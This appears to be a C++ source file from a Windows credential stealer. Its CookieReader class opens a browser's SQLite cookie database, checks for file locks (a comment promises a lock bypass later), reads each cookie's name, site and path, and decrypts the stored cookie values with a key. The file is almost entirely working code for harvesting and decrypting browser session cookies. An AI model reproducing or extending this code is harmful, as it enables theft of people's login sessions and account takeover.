#include "content.h"

CookieReader::~CookieReader() {
	if (this->database) {
		sqlite3_close(this->database);
	}

	if (this->statement) {
		sqlite3_finalize(this->statement);
	}

	if (this->cookies.size() > 0) {
		for (auto& cookie : this->cookies) {
			delete cookie;
		}
	}
}

BOOL CookieReader::isLocked() {
	auto filePath = this->filePath;

	HANDLE file = CreateFileA(
		filePath,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		0
	);

	return (file == INVALID_HANDLE_VALUE && GetLastError() == ERROR_SHARING_VIOLATION);
}

BOOL CookieReader::initSqliteDb() {
	if (this->isLocked()) {
		return FALSE; // deadlock file lock bypass will be integrated later
	}
	else {
		return sqlite3_open(this->filePath, &this->database) == SQLITE_OK;
	}
}

BOOL CookieReader::prepare(LPCSTR statement) {
	return sqlite3_prepare_v2(this->database, statement, -1, &this->statement, NULL) == SQLITE_OK;
}

BOOL CookieReader::step() {
	return sqlite3_step(this->statement) == SQLITE_ROW;
}

LPCSTR CookieReader::getText(int colIndex) {
	return (LPCSTR)sqlite3_column_text(this->statement, colIndex);
}

int CookieReader::getInt(int colIndex) {
	return sqlite3_column_int(this->statement, colIndex);
}

int CookieReader::getBytes(int colIndex) {
	return sqlite3_column_bytes(this->statement, colIndex);
}

void CookieReader::populateCookies() {

	while (this->step()) {
		auto name = this->getText(0);
		auto site = this->getText(1);
		auto path = this->getText(2);

		auto blobSize = this->getBytes(3);
		auto encCookie = this->getBlob<PBYTE>(3);

		vector<BYTE> cookiesVec(encCookie, encCookie + blobSize);

		string cookie = decryptor::decrypt(key, cookiesVec);

		auto entry = new CookieEntry{ name, site, path, cookie };

		this->cookies.push_back(entry);
	}
}